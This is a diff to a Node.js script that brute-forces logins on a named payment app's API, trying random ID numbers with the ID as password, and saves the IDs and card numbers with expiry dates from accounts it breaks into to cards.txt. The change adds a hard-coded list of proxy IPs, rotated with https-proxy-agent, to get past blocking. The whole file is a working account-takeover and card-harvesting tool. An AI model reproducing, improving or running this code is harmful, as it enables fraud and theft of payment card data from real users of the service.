@@ -1,13 +1,18 @@
-const fetch = require('node-fetch');
-const fs = require("fs");
+//const fetch = import('node-fetch');
+const fs = require("fs")
+var list = [    "103.167.135.112:80","34.196.10.189:9090","51.255.99.186:3128","20.111.54.16:80",    "185.20.198.250:8080",    "140.227.61.156:23456",    "20.210.26.214:3128",    "124.158.186.254:8080",    "5.104.174.199:23500",    "39.107.33.254:8090",    "94.181.48.110:1256",    "198.59.191.234:8080"];
+var proxy = require("https-proxy-agent")
+
 i = 0;
 function fish(){
-var id = "012"+rand(7);
+  i++;
+var id = "011"+rand(7);
 //var id = "0125113504"
 var pass =id;
+var pro = list[rand(1)]
+Agent = new proxy.HttpsProxyAgent(pro);
 var status;
 var info;
-//console.log("trying"+ id+"|"+pass)
 fetch('https://syberapp.sybertechnology.com/api/login', {
     method: 'POST',
     headers: {
@@ -16,9 +21,10 @@ fetch('https://syberapp.sybertechnology.com/api/login', {
         'accept': 'application/json',
         'version': '100',
         'content-type': 'application/json;charset=utf-8',
-        
+      //  'content-length': '233',
         'accept-encoding': 'gzip',
-        'user-agent': 'okhttp/4.9.1'
+        'user-agent': 'okhttp/4.9.1',
+      agent:Agent
     },
     body: JSON.stringify({
         'userIdentifier': id,
@@ -30,11 +36,9 @@ status = response.status;
 return response.text()
   
 }).then((data)=>{
-  i++;
   info = data;
   js = JSON.parse(data);
-  //console.log(i)
-  
+  //console.log("trying "+ id+"|"+pass+" "+status)
   if(js.errorCode == 001){
   
 
@@ -46,9 +50,10 @@ fetch('https://syberapp.sybertechnology.com/api/login', {
         'accept': 'application/json',
         'version': '100',
         'content-type': 'application/json;charset=utf-8',
-        
+       // 'content-length': '233',
         'accept-encoding': 'gzip',
-        'user-agent': 'okhttp/4.9.1'
+        'user-agent': 'okhttp/4.9.1',
+        agent:Agent
     },
     body: JSON.stringify({
         'userIdentifier': id,
@@ -73,9 +78,10 @@ fetch('https://syberapp.sybertechnology.com/api/login', {
         'accept': 'application/json',
         'version': '100',
         'content-type': 'application/json;charset=utf-8',
-        
+      //  'content-length': '233',
         'accept-encoding': 'gzip',
-        'user-agent': 'okhttp/4.9.1'
+        'user-agent': 'okhttp/4.9.1',
+       agent:Agent
     },
     body: JSON.stringify({
         'userIdentifier': id,
@@ -90,27 +96,25 @@ return response.text()
   info = data;
   js = JSON.parse(data);
   if(js.errorCode == 001){
-   fish()
+fish()
+
   }else{
     var data = JSON.parse(data)
   fs.appendFile("123456789.txt",id+"\n",function (err) {if (err) throw err;console.log(id + " 123456789");});
   var cards = data.cards;
   if(cards.length > 0){
 data.cards.forEach((card)=>{
-console.log(card.pan)
     fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
   }
 fish();
   }
     
   }).catch((err)=>{
- console.log(" waiting 1 min "+i)
-    i =0;
-  setTimeout(function() {
-    fish()
-  }, 60000);
- // console.log("Timed out?"+status);
-  //console.log(info)
+    console.log("Blocked "+pro+" "+i);i=0;
+setTimeout(()=>{
+  fish()
+},60000)
+  console.log(info)
 })
 
 
@@ -121,21 +125,17 @@ fish();
   var cards = data.cards;
   if(cards.length > 0){
 data.cards.forEach((card)=>{
-  console.log(card.pan)
     fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
   }
 fish();
   }
     
   }).catch((err)=>{
-  
- // console.log("Timed out?"+status);
-  console.log(" waiting 1 min "+i)
-    i =0;
-  setTimeout(function() {
-    fish()
-  }, 60000);
-  
+    console.log("Blocked "+pro+" "+i);i=0;
+setTimeout(()=>{
+  fish()
+},60000)
+  console.log(info)
 })
 
 
@@ -148,24 +148,16 @@ fish();
   var cards = data.cards;
   if(cards.length > 0){
 data.cards.forEach((card)=>{
-  
-console.log(card.pan)
-
     fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
   }
 fish();
   }
   }).catch((err)=>{
-    
-   // var pos = err.search("token")
-    console.log(" waiting 1 min "+i)
-    i =0;
-  setTimeout(function() {
-    fish()
-  }, 60000);
-    
- // console.log("Timed out?"+status);
-  //console.log(info)
+    console.log("Blocked "+pro+" "+i);i=0;
+    setTimeout(()=>{
+      fish()
+    },60000)
+      console.log(info)
 })
 }
 fish()
